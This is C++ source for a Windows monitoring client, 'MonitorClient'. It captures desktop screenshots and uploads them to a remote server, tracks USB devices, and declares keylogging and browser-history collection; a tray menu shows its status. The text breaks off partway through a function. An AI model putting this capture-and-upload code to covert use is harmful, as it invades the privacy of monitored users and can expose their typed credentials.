#include <windows.h>
#include <wininet.h>
#include <wincred.h>
#include <cstring>
#include <cstddef>
#include <string>
#include <memory>
#include <atomic>
// MinGW compatibility patch
#ifndef _OBJIDL_H_
#include <objidl.h>
#endif
#ifndef _PROPID_DEFINED
#define _PROPID_DEFINED
typedef ULONG PROPID;
#endif
#include <gdiplus.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <setupapi.h>
#include <devguid.h>
#include <regstr.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <json/json.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <map>
#include <mutex>
#include <set>
#include <algorithm> // for std::replace
#include <cctype>
#include <cstdio>
#include <iomanip>   // for std::put_time
#include <iphlpapi.h> // for GetAdaptersInfo
#include <ShellScalingApi.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// Windows notification headers
#include <shellapi.h>
#include <commctrl.h>

// USB device notification constants (if not defined in MinGW)
#ifndef DBT_DEVICEARRIVAL
#define DBT_DEVICEARRIVAL 0x8000
#endif
#ifndef DBT_DEVICEREMOVECOMPLETE
#define DBT_DEVICEREMOVECOMPLETE 0x8004
#endif
#ifndef DBT_DEVTYP_DEVICEINTERFACE
#define DBT_DEVTYP_DEVICEINTERFACE 0x00000005
#endif
#ifndef GUID_DEVINTERFACE_USB_DEVICE
DEFINE_GUID(GUID_DEVINTERFACE_USB_DEVICE, 0xA5DCBF10L, 0x6530, 0x11D2, 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED);
#endif

// Additional USB device GUIDs for better monitoring
#ifndef GUID_DEVINTERFACE_USB_HUB
DEFINE_GUID(GUID_DEVINTERFACE_USB_HUB, 0xF359721BL, 0xA47B, 0x11D5, 0x9C, 0xE8, 0x00, 0x50, 0x56, 0xB8, 0x7F, 0x00);
#endif

#ifndef GUID_DEVINTERFACE_DISK
DEFINE_GUID(GUID_DEVINTERFACE_DISK, 0x53F56307L, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
#endif

#ifndef GUID_DEVINTERFACE_CDROM
DEFINE_GUID(GUID_DEVINTERFACE_CDROM, 0x53F56308L, 0xB6BF, 0x11D0, 0x94, 0xF2, 0x00, 0xA0, 0xC9, 0x1E, 0xFB, 0x8B);
#endif

#ifndef GUID_DEVINTERFACE_KEYBOARD
DEFINE_GUID(GUID_DEVINTERFACE_KEYBOARD, 0x884b96c3L, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);
#endif

#ifndef GUID_DEVINTERFACE_MOUSE
DEFINE_GUID(GUID_DEVINTERFACE_MOUSE, 0x378de44cL, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);
#endif

// Device broadcast structures (if not defined in MinGW)
#ifndef DEV_BROADCAST_HDR
typedef struct _DEV_BROADCAST_HDR {
    DWORD dbch_size;
    DWORD dbch_devicetype;
    DWORD dbch_reserved;
} DEV_BROADCAST_HDR, *PDEV_BROADCAST_HDR;
#endif

#ifndef DEV_BROADCAST_DEVICEINTERFACE
typedef struct _DEV_BROADCAST_DEVICEINTERFACE {
    DWORD dbcc_size;
    DWORD dbcc_devicetype;
    DWORD dbcc_reserved;
    GUID dbcc_classguid;
    char dbcc_name[1];
} DEV_BROADCAST_DEVICEINTERFACE, *PDEV_BROADCAST_DEVICEINTERFACE;
#endif

// Library linking is handled by CMakeLists.txt
// #pragma comment directives are MSVC-specific and not needed with MinGW
// #pragma comment(lib, "wininet.lib")
// #pragma comment(lib, "gdiplus.lib")
// #pragma comment(lib, "psapi.lib")
// #pragma comment(lib, "setupapi.lib")
// #pragma comment(lib, "sqlite3.lib")
// #pragma comment(lib, "Shcore.lib")
// #pragma comment(lib, "ole32.lib")
// #pragma comment(lib, "oleaut32.lib")
// #pragma comment(lib, "ws2_32.lib")

// Configuration constants (will be updated from API)
#define SCREEN_INTERVAL_DEFAULT 5
#define TIC_INTERVAL_DEFAULT 30
#define HISTORY_INTERVAL_DEFAULT 120
#define KEY_INTERVAL_DEFAULT 60
#define USB_INTERVAL_DEFAULT 30
#define CONFIG_REFRESH_INTERVAL_DEFAULT 300
#define STORAGE_CHECK_INTERVAL 5

// Current configuration values (updated from API)
int screenInterval = SCREEN_INTERVAL_DEFAULT;
int ticInterval = TIC_INTERVAL_DEFAULT;
int historyInterval = HISTORY_INTERVAL_DEFAULT;
int keyInterval = KEY_INTERVAL_DEFAULT;
int usbInterval = USB_INTERVAL_DEFAULT;
int configRefreshInterval = CONFIG_REFRESH_INTERVAL_DEFAULT;
#define WM_TRAYICON (WM_USER + 1)
#define ID_TRAY_EXIT 1001
#define ID_TRAY_STATUS 1002
#define ID_TRAY_SEND_ALL 1003
#define ID_TRAY_CLIENT_INFO 1004
#define ID_TRAY_SERVER_INFO 1005
#define ID_TRAY_SCREENSHOT_STATUS 1006
#define ID_TRAY_TIC_STATUS 1007
#define ID_TRAY_BROWSER_STATUS 1008
#define ID_TRAY_KEYLOG_STATUS 1009
#define ID_TRAY_USB_STATUS 1010
#define ID_TRAY_CONFIG_REFRESH 1011
#define ID_TRAY_SIGN_IN 1012
#define ID_TRAY_SETTINGS 1013
#define ID_TRAY_NOTIFICATIONS 1014

// Configuration structures
struct IntervalsConfig {
    int screenshot;
    int tic;
    int history;
    int keylog;
    int usb;
    int config_refresh;
};

struct ServerConfig {
    int max_retry_attempts;
    int connection_timeout;
    int request_timeout;
    int chunk_size;
    bool compression_enabled;
};

struct FeaturesConfig {
    bool screenshot_enabled;
    bool browser_history_enabled;
    bool keylog_enabled;
    bool usb_monitoring_enabled;
    bool debug_logging_enabled;
    bool auto_update_enabled;
};

struct ClientConfig {
    IntervalsConfig intervals;
    ServerConfig server;
    FeaturesConfig features;
    std::string platform;
    std::string version;
    std::string last_updated;
};

// Global variables
std::string macAddress;
std::string serverIP;
std::string serverPort;
std::string username;
std::mutex authMutex;
std::string clientToken;
std::atomic<int> selectedMonitorId{0};
std::atomic<bool> notificationsEnabled{true};
std::string signedInUsername;
std::string signedInFullName;
bool showMonitorSettings();
bool restoreClientSession();
static HWND activeSettingsWindow=nullptr;
std::string getClientToken(){std::lock_guard<std::mutex> g(authMutex);return clientToken;}

// Global configuration
ClientConfig currentConfig;
bool isConfigUpdating = false;
std::chrono::system_clock::time_point lastConfigUpdate;
double lastBrowserTic = -1;
bool activeRunning = true;

// Memory management constants
const size_t MAX_KEY_LOGS = 1000;
const size_t MAX_USB_LOGS = 500;
const size_t MAX_BROWSER_HISTORIES = 2000;

std::vector<Json::Value> keyLogs;
std::vector<Json::Value> usbDeviceLogs;
std::vector<Json::Value> browserHistories;
std::mutex dataMutex;
HHOOK keyboardHook = NULL;
HHOOK mouseHook = NULL;

// System tray variables
NOTIFYICONDATAA nid;
HMENU hTrayMenu = NULL;
HWND hMainWindow = NULL;

// Connection status tracking
struct ConnectionStatus {
    std::atomic<bool> serverConnected{false};
    bool previousServerConnected = false; // Track previous state for notifications
    std::string lastScreenshotStatus = "Never";
    std::string lastTicStatus = "Never";
    std::string lastHistoryStatus = "Never";
    std::string lastKeyLogStatus = "Never";
    std::string lastUSBLogStatus = "Never";
    std::string lastError = "";
    std::chrono::steady_clock::time_point lastSuccess = std::chrono::steady_clock::now();
};
std::mutex statusMutex;
ConnectionStatus connectionStatus;

// Browser history tracking - store last fetch times for each browser
int64_t lastChromeFetch = 0;
int64_t lastFirefoxFetch = 0;
int64_t lastEdgeFetch = 0;

// Log file for debugging
std::ofstream debugLogFile;

// Configuration
std::string API_BASE_URL;
std::string API_ROUTE = "/webapi.php";
std::string TIC_ROUTE = "/eventhandler.php";
#ifndef MONITORCLIENT_VERSION
#define MONITORCLIENT_VERSION "1.5"
#endif
std::string APP_VERSION = MONITORCLIENT_VERSION;

// USB monitoring using WMI
std::thread usbMonitoringThread;
bool usbMonitoringActive = false;

// Structure for browser history
struct BrowserHistoryEntry {
    std::string date;
    std::string url;
    std::string title;
};

// Structure for key log
struct KeyLogEntry {
    std::string date;
    std::string application;
    std::string key;
};

// Structure for USB device log
struct USBDeviceEntry {
    std::string date;
    std::string device;
    std::string action;
};

// Function declarations
std::string getMacAddress();
std::string getCurrentDateTimeString();
std::string getWireDateTimeString();
std::string getActiveWindowTitle();
std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
std::string takeScreenshot();
bool sendScreenshot(const std::string& filePath);
bool sendTicEvent();
bool sendBrowserHistories();
bool sendKeyLogs();
bool sendUSBLogs();
bool updateUsername(const std::string& newUsername);
void collectBrowserHistory();
void setupKeyboardHook();
void removeKeyboardHook();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
std::string getLocalIPAddress();
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
void setupUSBMONITORING();
void cleanupUSBMONITORING();
std::string httpPost(const std::string& url, const std::string& data);
std::string httpPostFile(const std::string& url, const std::string& filePath);
std::string getChromeHistory(int64_t sinceTime = 0);
std::string getFirefoxHistory(int64_t sinceTime = 0);
std::string getEdgeHistory(int64_t sinceTime = 0);
void monitorTask();
void writeDebugLog(const std::string& message);
bool loadSettings();
bool fetchConfigurationFromAPI();
void updateConfiguration(const Json::Value& config);
void manualConfigRefresh();
void setupSystemTray();
void cleanupSystemTray();
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void updateTrayIcon();
void showConnectionError(const std::string& error);
bool testServerConnection();
void showToastNotification(const std::string& title, const std::string& message, const std::string& type = "info");
void checkConnectionStatusChange();
void updateTrayMenu();
void manageMemoryLimits();
void sendInitialDataRequests();
void cleanupTemporaryFiles();
bool showClientLogin();

// Show Windows notification
void showToastNotification(const std::string& title, const std::string& message, const std::string& type) {
    if (!notificationsEnabled.load()) return;
    if (nid.hWnd == NULL) return;
    // Never put NIF_INFO into the persistent tray icon flags: later icon
    // updates can otherwise replay an old balloon even after disabling them.
    NOTIFYICONDATAA alert=nid;
    alert.uFlags=NIF_INFO;
    alert.dwInfoFlags=(type=="error")?NIIF_ERROR:NIIF_INFO;
    const size_t msgLength=message.copy(alert.szInfo,sizeof(alert.szInfo)-1);
    alert.szInfo[msgLength]='\0';
    const size_t titleLength=title.copy(alert.szInfoTitle,sizeof(alert.szInfoTitle)-1);
    alert.szInfoTitle[titleLength]='\0';
    Shell_NotifyIconA(NIM_MODIFY,&alert);
}

static void clearPendingTrayNotification(){
    if(nid.hWnd==NULL)return;
    NOTIFYICONDATAA empty=nid;
    empty.uFlags=NIF_INFO;
    empty.szInfo[0]='\0';
    empty.szInfoTitle[0]='\0';
    Shell_NotifyIconA(NIM_MODIFY,&empty);
    nid.uFlags&=~NIF_INFO;
    nid.szInfo[0]='\0';
    nid.szInfoTitle[0]='\0';
}

// Check for connection status changes and show notifications
void checkConnectionStatusChange() {
    std::lock_guard<std::mutex> lock(statusMutex);
    
    if (connectionStatus.serverConnected != connectionStatus.previousServerConnected) {
        if (connectionStatus.serverConnected) {
            showToastNotification("Server Connected", "Successfully connected to monitoring server", "info");
        } else {
            showToastNotification("Server Disconnected", "Lost connection to monitoring server", "error");
        }
        connectionStatus.previousServerConnected = connectionStatus.serverConnected;
    }
}

// Update tray menu with current status
void updateTrayMenu() {
    std::lock_guard<std::mutex> lock(statusMutex);
    if (!hTrayMenu) return;
    
    // Clear the menu
    while (GetMenuItemCount(hTrayMenu) > 0) {
        DeleteMenu(hTrayMenu, 0, MF_BYPOSITION);
    }
    
    // Add client information section
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_CLIENT_INFO, "=== CLIENT INFO ===");
    
    // Client IP and MAC
    std::string clientIP = getLocalIPAddress();
    std::string clientInfo = "IP: " + clientIP + " | MAC: " + macAddress;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_CLIENT_INFO, clientInfo.c_str());
    
    // Server information section
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SERVER_INFO, "=== SERVER INFO ===");
    
    std::string serverInfo = "Server: " + serverIP + ":" + serverPort;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SERVER_INFO, serverInfo.c_str());
    
    std::string serverConnectionStatus = connectionStatus.serverConnected ? "Status: Connected" : "Status: Disconnected";
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SERVER_INFO, serverConnectionStatus.c_str());
    
    // Request status section
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_STATUS, "=== REQUEST STATUS ===");
    
    // Screenshot status
    std::string screenshotStatus = "Screenshots: " + connectionStatus.lastScreenshotStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_SCREENSHOT_STATUS, screenshotStatus.c_str());
    
    // Tic status
    std::string ticStatus = "Tic Events: " + connectionStatus.lastTicStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_TIC_STATUS, ticStatus.c_str());
    
    // Browser history status
    std::string browserStatus = "Browser History: " + connectionStatus.lastHistoryStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_BROWSER_STATUS, browserStatus.c_str());
    
    // Key log status
    std::string keyLogStatus = "Key Logs: " + connectionStatus.lastKeyLogStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_KEYLOG_STATUS, keyLogStatus.c_str());
    
    // USB log status
    std::string usbStatus = "USB Logs: " + connectionStatus.lastUSBLogStatus;
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_USB_STATUS, usbStatus.c_str());
    
    // Configuration section
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING | MF_DISABLED, ID_TRAY_STATUS, "=== CONFIGURATION ===");
    
    // Configuration refresh button
    // Configuration refresh is now in the Settings window.
    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_SETTINGS, "Settings...");
    // Notification preference is saved from Settings.
    
    // Actions section
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    // Manual log upload is now in Settings.
    AppendMenuA(hTrayMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuA(hTrayMenu, MF_STRING, ID_TRAY_EXIT, "Quit MonitorClient");
}

// Setup USB monitoring using device notifications (more efficient)
void setupUSBMONITORING() {
    usbMonitoringActive = true;
    usbMonitoringThread = std::thread([]() {
        
        // Get initial USB devices list (one-time scan)
        std::set<std::string> knownDevices;
        HDEVINFO deviceInfoSet = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
        if (deviceInfoSet != INVALID_HANDLE_VALUE) {
            SP_DEVINFO_DATA deviceInfoData;
            deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
            
            DWORD deviceIndex = 0;
            while (SetupDiEnumDeviceInfo(deviceInfoSet, deviceIndex, &deviceInfoData)) {
                char deviceId[256] = {0};
                if (SetupDiGetDeviceInstanceIdA(deviceInfoSet, &deviceInfoData, deviceId, sizeof(deviceId), NULL)) {
                    knownDevices.insert(deviceId);
                }
                deviceIndex++;
            }
            SetupDiDestroyDeviceInfoList(deviceInfoSet);
            // Initial USB devices scan completed
        }
        
        // Now use periodic checks but with much longer intervals (30 seconds instead of 2)
        while (usbMonitoringActive) {
            std::this_thread::sleep_for(std::chrono::seconds(30)); // Reduced from 2 seconds to 30 seconds
            
            if (!usbMonitoringActive) break;
            
            // Quick scan for changes
            std::set<std::string> currentDevices;
            HDEVINFO deviceInfoSet = SetupDiGetClassDevsA(&GUID_DEVCLASS_USB, NULL, NULL, DIGCF_PRESENT);
            if (deviceInfoSet != INVALID_HANDLE_VALUE) {
                SP_DEVINFO_DATA deviceInfoData;
                deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
                
                DWORD deviceIndex = 0;
                while (SetupDiEnumDeviceInfo(deviceInfoSet, deviceIndex, &deviceInfoData)) {
                    char deviceId[256] = {0};
                    if (SetupDiGetDeviceInstanceIdA(deviceInfoSet, &deviceInfoData, deviceId, sizeof(deviceId), NULL)) {
                        std::string deviceIdStr = deviceId;
                        currentDevices.insert(deviceIdStr);
                        
                        // Check if this is a new device
                        if (knownDevices.find(deviceIdStr) == knownDevices.end()) {
                            // New device connected
                            std::string deviceName = "USB Device";
                            
                            // Try to get friendly name
                            char friendlyName[256] = {0};
                            if (SetupDiGetDeviceRegistryPropertyA(deviceInfoSet, &deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)friendlyName, sizeof(friendlyName), NULL)) {
                                deviceName = friendlyName;
                            } else {
                                char deviceDesc[256] = {0};
                                if (SetupDiGetDeviceRegistryPropertyA(deviceInfoSet, &deviceInfoData, SPDRP_DEVICEDESC, NULL, (PBYTE)deviceDesc, sizeof(deviceDesc), NULL)) {
                                    deviceName = deviceDesc;
                                }
                            }
                            
                            Json::Value usbLog;
                            usbLog["date"] = getWireDateTimeString();
                            usbLog["device_name"] = deviceName;
                            usbLog["device_path"] = deviceIdStr;
                            usbLog["device_type"] = "USB Device";
                            usbLog["action"] = "Connected";
                            
                            // USB Device Connected
                            
                            // Show toast notification for USB device connected
                            showToastNotification("USB Device Connected", deviceName, "info");
                            
                            std::lock_guard<std::mutex> lock(dataMutex);
                            usbDeviceLogs.push_back(usbLog);
                        }
                    }
                    deviceIndex++;
                }
                
                SetupDiDestroyDeviceInfoList(deviceInfoSet);
            }
            
            // Check for disconnected devices
            for (const auto& device : knownDevices) {
                if (currentDevices.find(device) == currentDevices.end()) {
                    // Device disconnected
                    Json::Value usbLog;
                    usbLog["date"] = getWireDateTimeString();
                    usbLog["device_name"] = "USB Device";
                    usbLog["device_path"] = device;
                    usbLog["device_type"] = "USB Device";
                    usbLog["action"] = "Disconnected";
                    
                    // USB Device Disconnected
                    
                    // Show toast notification for USB device disconnected
                    showToastNotification("USB Device Disconnected", "USB device was removed", "warning");
                    
                    std::lock_guard<std::mutex> lock(dataMutex);
                    usbDeviceLogs.push_back(usbLog);
                }
            }
            
            knownDevices = currentDevices;
        }
        
        // USB monitoring thread stopped
    });
}

// Cleanup USB monitoring
void cleanupUSBMONITORING() {
    usbMonitoringActive = false;
    
    if (usbMonitoringThread.joinable()) {
        usbMonitoringThread.join();
    }
}

// Get MAC address - improved version to get primary active adapter
std::string getMacAddress() {
    std::string macAddress;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    
    if (pAdapterInfo == NULL) {
        return "";
    }
    
    // First call to get required buffer size
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            return "";
        }
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        std::string bestMac = "";
        int bestPriority = -1;
        
        while (pAdapter) {
            // Only process adapters with valid MAC addresses
            if (pAdapter->AddressLength == 6) {
                // Check if adapter has a valid IP address
                bool hasValidIP = false;
                PIP_ADDR_STRING pIPAddr = &pAdapter->IpAddressList;
                while (pIPAddr) {
                    std::string ip = pIPAddr->IpAddress.String;
                    if (!ip.empty() && ip != "0.0.0.0" && 
                        ip.substr(0, 4) != "127." && 
                        ip.substr(0, 8) != "169.254." &&
                        ip.find(':') == std::string::npos) {
                        hasValidIP = true;
                        break;
                    }
                    pIPAddr = pIPAddr->Next;
                }
                
                if (hasValidIP) {
                    char mac[18];
                    sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                        pAdapter->Address[0], pAdapter->Address[1],
                        pAdapter->Address[2], pAdapter->Address[3],
                        pAdapter->Address[4], pAdapter->Address[5]);
                    
                    // Priority system: Ethernet > Wi-Fi > Others
                    int priority = 0;
                    if (pAdapter->Type == MIB_IF_TYPE_ETHERNET) {
                        priority = 3; // Highest priority for Ethernet
                    } else if (pAdapter->Type == IF_TYPE_IEEE80211) {
                        priority = 2; // Second priority for Wi-Fi
                    } else if (pAdapter->Type == IF_TYPE_PPP) {
                        priority = 1; // Low priority for PPP (dial-up, VPN)
                    } else {
                        priority = 0; // Lowest priority for others
                    }
                    
                    // Also check adapter name for additional hints
                    std::string adapterName = pAdapter->AdapterName;
                    std::string description = pAdapter->Description;
                    
                    // Boost priority for adapters that are likely primary
                    if (description.find("Ethernet") != std::string::npos || 
                        description.find("Gigabit") != std::string::npos ||
                        description.find("Realtek") != std::string::npos ||
                        description.find("Intel") != std::string::npos) {
                        priority += 1;
                    }
                    
                    // Skip virtual adapters and tunnels
                    if (description.find("Virtual") == std::string::npos &&
                        description.find("Tunnel") == std::string::npos &&
                        description.find("Loopback") == std::string::npos &&
                        description.find("VMware") == std::string::npos &&
                        description.find("VirtualBox") == std::string::npos) {
                        
                        if (priority > bestPriority) {
                            bestMac = std::string(mac);
                            bestPriority = priority;
                            // Found candidate MAC
                        }
                    }
                }
            }
            pAdapter = pAdapter->Next;
        }
        
        if (!bestMac.empty()) {
            macAddress = bestMac;
        }
    } else {
        // GetAdaptersInfo failed
    }
    
    free(pAdapterInfo);
    
    // Final validation
    if (macAddress.empty()) {
        // Could not determine MAC address
    } else {
        // MAC address determined
    }
    
    return macAddress;
}

// Get current date time string
std::string getCurrentDateTimeString() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

// Timestamp used for telemetry payloads. Include the Windows machine's UTC
// offset so the backend can normalize independently of server timezone.
std::string getWireDateTimeString() {
    TIME_ZONE_INFORMATION tz{};
    DWORD state=GetTimeZoneInformation(&tz);
    LONG bias=tz.Bias;
    if(state==TIME_ZONE_ID_DAYLIGHT) bias+=tz.DaylightBias;
    else if(state==TIME_ZONE_ID_STANDARD) bias+=tz.StandardBias;
    const LONG east=-bias;
    const LONG magnitude=east<0?-east:east;
    auto now=std::chrono::system_clock::now();
    auto stamp=std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&stamp), "%Y-%m-%dT%H:%M:%S")
       << (east>=0?"+":"-") << std::setfill('0') << std::setw(2)
       << (magnitude/60) << ":" << std::setw(2) << (magnitude%60);
    return ss.str();
}

// Get active window title
std::string getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd == NULL) return "Unknown";
    
    char windowTitle[256];
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
    
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        char processName[MAX_PATH];
        if (GetModuleBaseNameA(hProcess, NULL, processName, sizeof(processName)) > 0) {
            CloseHandle(hProcess);
            return std::string(processName) + " (" + std::string(windowTitle) + ")";
        }
        CloseHandle(hProcess);
    }
    
    return std::string(windowTitle);
}

// Get key name from virtual key code
std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags) {
    char keyName[256];
    UINT scanCodeMap = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    
    if (GetKeyNameTextA(scanCodeMap << 16, keyName, sizeof(keyName)) > 0) {
        return std::string(keyName);
    }
    
    // Fallback for common keys
    switch (vkCode) {
        case VK_RETURN: return "Enter";
        case VK_ESCAPE: return "Escape";
        case VK_TAB: return "Tab";
        case VK_SPACE: return "Space";
        case VK_BACK: return "Backspace";
        case VK_DELETE: return "Delete";
        case VK_INSERT: return "Insert";
        case VK_HOME: return "Home";
        case VK_END: return "End";
        case VK_PRIOR: return "Page Up";
        case VK_NEXT: return "Page Down";
        case VK_LEFT: return "Left";
        case VK_RIGHT: return "Right";
        case VK_UP: return "Up";
        case VK_DOWN: return "Down";
        case VK_F1: return "F1";
        case VK_F2: return "F2";
        case VK_F3: return "F3";
        case VK_F4: return "F4";
        case VK_F5: return "F5";
        case VK_F6: return "F6";
        case VK_F7: return "F7";
        case VK_F8: return "F8";
        case VK_F9: return "F9";
        case VK_F10: return "F10";
        case VK_F11: return "F11";
        case VK_F12: return "F12";
        default: return "Key" + std::to_string(vkCode);
    }
}

// Move GetEncoderClsid declaration up
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

// Take screenshot to temporary file
std::string takeScreenshot() {
    // Get the desktop window handle
    HWND hDesktop = GetDesktopWindow();
    
    // Get the desktop DC
    HDC hdcScreen = GetDC(hDesktop);
    HDC hdcMemory = CreateCompatibleDC(hdcScreen);
    
    // Get the desktop dimensions (now DPI-aware)
    RECT desktopRect;
    GetWindowRect(hDesktop, &desktopRect);
    
    int captureWidth = desktopRect.right - desktopRect.left;
    int captureHeight = desktopRect.bottom - desktopRect.top;
    
    // Desktop dimensions captured
    
    // Create a bitmap at the correct resolution
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, captureWidth, captureHeight);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMemory, hbmScreen);
    
    // Capture the entire desktop
    BitBlt(hdcMemory, 0, 0, captureWidth, captureHeight, hdcScreen, 0, 0, SRCCOPY);
    
    // Save to temporary file using GDI+ with optimized compression
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hbmScreen, NULL);
    
    // Use JPEG encoder for better compression instead of PNG
    CLSID jpegClsid;
    GetEncoderClsid(L"image/jpeg", &jpegClsid);
    
    // Set JPEG quality parameters for smaller file size
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    
    // Set quality to 70% (good balance between quality and size)
    ULONG quality = 70;
    encoderParams.Parameter[0].Value = &quality;
    
    // Create temporary file path
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempFileName = std::string(tempPath) + "screenshot_" + std::to_string(GetTickCount()) + ".jpg";
    
    std::wstring wTempFileName(tempFileName.begin(), tempFileName.end());
    
    bmp->Save(wTempFileName.c_str(), &jpegClsid, &encoderParams);
    
    delete bmp;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    SelectObject(hdcMemory, hbmOld);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMemory);
    ReleaseDC(NULL, hdcScreen);
    
    return tempFileName;
}

// Move GetEncoderClsid definition above takeScreenshot
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// Send screenshot to server
bool sendScreenshot(const std::string& filePath) {
    std::string url = API_BASE_URL + API_ROUTE + "?type=upload";
    if(selectedMonitorId.load()<1)return false;
    std::string response = httpPostFile(url, filePath);
    
    // Keep failed captures available for investigation/retry; remove after
    // the server explicitly acknowledges successful storage.
    
    // Parse response
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("status") && root["status"].asString() == "success") {
            // Update connection status
            {
                std::lock_guard<std::mutex> lock(statusMutex);
                connectionStatus.lastScreenshotStatus = getCurrentDateTimeString();
                connectionStatus.serverConnected = true;
                connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            }
            DeleteFileA(filePath.c_str());
            writeDebugLog("Screenshot uploaded successfully");
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else if (root.isMember("error")) {
            std::string errorMsg = root["error"].asString();
            writeDebugLog("Screenshot upload error: " + errorMsg);
            connectionStatus.lastError = "Screenshot: " + errorMsg;
        }
    }
    else {
        writeDebugLog("Screenshot upload response was not valid JSON or was empty.");
        std::lock_guard<std::mutex> lock(statusMutex);
        connectionStatus.lastScreenshotStatus = "Failed: " + getCurrentDateTimeString();
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Screenshot upload failed";
    }
    updateTrayIcon();
    checkConnectionStatusChange();
    
    return false;
}

// Send tic event
bool sendTicEvent() {
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "Tic";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
